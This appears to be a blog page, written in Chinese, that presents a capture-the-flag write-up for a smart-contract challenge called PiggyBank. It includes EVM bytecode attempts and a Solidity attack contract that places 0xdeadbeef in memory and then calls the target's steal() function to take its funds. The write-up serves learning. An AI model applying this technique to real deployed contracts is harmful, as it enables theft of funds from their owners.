@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>PiggyBank | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="研究下面的条件就可以发现，要求thief的每一个元素都是deadbeef，疑点：这里assembly的执行顺序是什么？明明第二步就给thiefcode赋值了，但是extcodecopy结束以后才赋值成功 thifecode中的每一个元素是否都是8个16进制数？内存是怎么区分它的每一个元素的？ 在内存中也存了一份 思路一：模仿magicnumber那样，在创建时代码中调用steal，运行时代码全都是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PiggyBank">
+<meta property="og:url" content="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="研究下面的条件就可以发现，要求thief的每一个元素都是deadbeef，疑点：这里assembly的执行顺序是什么？明明第二步就给thiefcode赋值了，但是extcodecopy结束以后才赋值成功 thifecode中的每一个元素是否都是8个16进制数？内存是怎么区分它的每一个元素的？ 在内存中也存了一份 思路一：模仿magicnumber那样，在创建时代码中调用steal，运行时代码全都是">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/image.png">
+<meta property="og:image" content="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/image-1.png">
+<meta property="og:image" content="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/image-2.png">
+<meta property="og:image" content="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/image-3.png">
+<meta property="og:image" content="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/image-4.png">
+<meta property="og:image" content="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/image-6.png">
+<meta property="og:image" content="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/image-5.png">
+<meta property="article:published_time" content="2023-11-27T08:58:00.000Z">
+<meta property="article:modified_time" content="2023-11-27T09:00:00.920Z">
+<meta property="article:author" content="fathergun">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/image.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://oo90909.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-区块链安全/其他/PiggyBank" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/" class="article-date">
+  <time class="dt-published" datetime="2023-11-27T08:58:00.000Z" itemprop="datePublished">2023-11-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      PiggyBank
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>研究下面的条件就可以发现，要求thief的每一个元素都是deadbeef，<br>疑点：<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/image.png" alt="Alt text"><br>这里assembly的执行顺序是什么？明明第二步就给thiefcode赋值了，但是extcodecopy结束以后才赋值成功</p>
+<p>thifecode中的每一个元素是否都是8个16进制数？内存是怎么区分它的每一个元素的？</p>
+<p><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/image-1.png"><br>在内存中也存了一份<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/image-2.png" alt="Alt text"></p>
+<p>思路一：模仿magicnumber那样，在创建时代码中调用steal，运行时代码全都是deadbeef就可以了，然后再create</p>
+<p>返回目标值的运行时代码<br>73deadbeefdeadbeefdeadbeefdeadbeefdeadbeef600052601c6000f3<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/image-3.png" alt="Alt text"><br>return是这样的，但是也无所谓，因为这些0都会消失<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/image-4.png" alt="Alt text"></p>
+<p>包含create的创建时代码<br>7b73deadbeefdeadbeefdeadbeefdeadbeefdeadbeef600052601c6000f3600052601c60006000f0</p>
+<p>那要如何调用那个合约的函数呢？用call函数，再上面那一部分代码之前调用call函数即可</p>
+<hr>
+<p>###正解：<br>其实并没有那么复杂，看题目的时候看错了，只需要满足某一次if条件就会转账成功然后return，因此不需要创建合约，只需要保证合约字节码里面有deadbeef就可以了，这个时候就需要使用mstore就行了</p>
+<p><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/image-6.png" alt="看绿色的字，这里需要注意一些条件"></p>
+<p>###成功<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/image-5.png" alt="Alt text"></p>
+<p>攻击合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line"></span><br><span class="line">    PiggyBank pb;</span><br><span class="line"></span><br><span class="line">constructor(address _pb)public  &#123;</span><br><span class="line">pb=PiggyBank(_pb);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hack()public  &#123;</span><br><span class="line">    assembly&#123;</span><br><span class="line">    mstore(0,0xdeadbeef00)//这里要满足几个条件：保证字节数必须是偶数，而不是字符数，也就是说如果</span><br><span class="line">    //告诉你是奇数，那就代表你少了两个字符，如果revert not found则有以下几种情况：deadbeef前面</span><br><span class="line">    //有偶数个字符，则d和e会被拆分开，那就需要在前面加一个字符；真的没有deadbeef</span><br><span class="line">&#125;</span><br><span class="line">    pb.steal();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function () external  payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/" data-id="clr5va9a0000dxcudbmo0ckfk" data-title="PiggyBank" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Missing/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Missing
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Vault</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/01/08/%E6%9D%82%E6%96%87/%E6%AF%9B%E6%B3%BD%E4%B8%9C/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/07/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/07/%E6%9D%82%E6%96%87/%E5%92%8B/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/06/%E6%9D%82%E6%96%87/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/12/15/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BC%80%E5%8F%91/ERC721/ipfs/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 fathergun<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
